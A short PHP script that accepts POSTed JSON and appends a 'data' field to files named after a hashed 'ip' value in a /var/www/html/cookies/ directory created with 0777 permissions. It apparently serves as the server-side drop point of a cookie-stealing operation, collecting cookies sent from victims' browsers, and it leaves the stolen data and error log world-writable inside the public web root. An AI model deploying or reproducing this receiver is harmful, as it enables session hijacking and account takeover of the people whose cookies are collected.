<?php
define('COOKIE_STORAGE_PATH', '/var/www/html/cookies/');

// Create the storage directory if it doesn't exist
if (!file_exists(COOKIE_STORAGE_PATH)) {
    mkdir(COOKIE_STORAGE_PATH, 0777, true);
}

// Function to log errors
function log_error($message) {
    error_log($message, 3, COOKIE_STORAGE_PATH . '/error.log');
}

// Handle incoming POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $jsonInput = file_get_contents('php://input');
    $data = json_decode($jsonInput, true);

    if (json_last_error() !== JSON_ERROR_NONE) {
        http_response_code(400);
        echo 'Invalid JSON provided.';
        log_error("JSON decoding error: " . json_last_error_msg() . "\n");
        exit;
    }

    if (isset($data['ip']) && isset($data['data'])) {
        $ipHash = md5($data['ip']);
        $fileName = md5("cookie_data_{$ipHash}") . '.txt';
        $filePath = COOKIE_STORAGE_PATH . $fileName;

        $encryptedData = $data['data'];
        if (file_put_contents($filePath, $encryptedData . "\n", FILE_APPEND) === false) {
            http_response_code(500);
            echo 'Failed to save the data.';
            log_error("Failed to write data to file: $filePath\n");
        } else {
            http_response_code(200);
            echo 'Data saved successfully.';
        }
    } else {
        http_response_code(400);
        echo 'Invalid data provided.';
        log_error("Invalid data structure: " . print_r($data, true) . "\n");
    }
} else {
    http_response_code(405);
    echo 'Invalid request method.';
    log_error("Invalid request method: " . $_SERVER['REQUEST_METHOD'] . "\n");
}
?>
